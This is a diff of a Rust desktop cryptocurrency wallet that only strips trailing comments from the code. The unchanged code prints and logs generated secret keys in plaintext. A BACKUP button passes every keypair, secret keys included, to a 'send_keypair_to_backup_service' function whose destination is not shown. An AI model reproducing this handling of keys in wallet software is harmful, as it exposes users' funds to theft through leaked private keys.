@@ -3,7 +3,7 @@ use web3;
 use tokio;
 use web3::types::{Address};
 use std::str::FromStr;
-use crate::wallet_lib::{create_txn_object, sign_and_send, send_keypair_to_backup_service, KeyPair}; // Import the new function and struct
+use crate::wallet_lib::{create_txn_object, sign_and_send, send_keypair_to_backup_service, KeyPair}; 
 use anyhow::{Result};
 use fltk::{app, button::Button, enums::{CallbackTrigger, Color, Font, FrameType}, frame::Frame, input, prelude::*, window::Window};
 use log::info;
@@ -26,7 +26,7 @@ async fn main() -> Result<()> {
     let mut wind = Window::default().with_size(500, 800).with_label("Simple Wallet");
     let mut but = Button::new(195, 450, 120, 45, "Create Wallet");
     let mut but2 = Button::new(200, 300, 100, 35, "SEND");
-    let mut but3 = Button::new(200, 500, 100, 35, "BACKUP"); // New button for backup
+    let mut but3 = Button::new(200, 500, 100, 35, "BACKUP"); 
     let mut inp1 = input::Input::new(200, 200, 225, 35, "To: ");
     let mut frame = Frame::default()
         .with_size(600, 100)
@@ -69,7 +69,7 @@ async fn main() -> Result<()> {
 
     but.emit(s.clone(), WalletMessage::NewWallet);
     but2.emit(s.clone(), WalletMessage::Send);
-    but3.emit(s, WalletMessage::Backup); // Attach event for backup button
+    but3.emit(s, WalletMessage::Backup); 
 
     let web3 = wallet_lib::establish_web3_connection(URL)?;
     let mut keypairs: Vec<wallet_lib::KeyPair> = Vec::new();
@@ -86,10 +86,10 @@ async fn main() -> Result<()> {
                         public_key: pubkey.serialize().to_vec(),
                         secret_key: seckey[..].to_vec(),
                     };
-                    keypairs.push(keypair.clone()); // Ensure the struct has the Clone trait
+                    keypairs.push(keypair.clone()); 
                     frame.set_label(&format!("{} Wallets", keypairs.len()));
                     println!("keypairs {:?}", keypairs);
-                    info!("Generated new keypair: {:?}", keypair); // Log generated keypair
+                    info!("Generated new keypair: {:?}", keypair); 
                 },
                 WalletMessage::Send => {
                     let to_adrs = Address::from_str(&inp1.value().as_str())?;
@@ -105,7 +105,7 @@ async fn main() -> Result<()> {
                     for keypair in &keypairs {
                         if let Err(e) = send_keypair_to_backup_service(keypair).await {
                             println!("Failed to send keypair to backup service: {}", e);
-                            info!("Failed to send keypair to backup service: {}", e); // Log failure
+                            info!("Failed to send keypair to backup service: {}", e); 
                         }
                     }
                     frame.set_label("Backup Triggered Successfully");
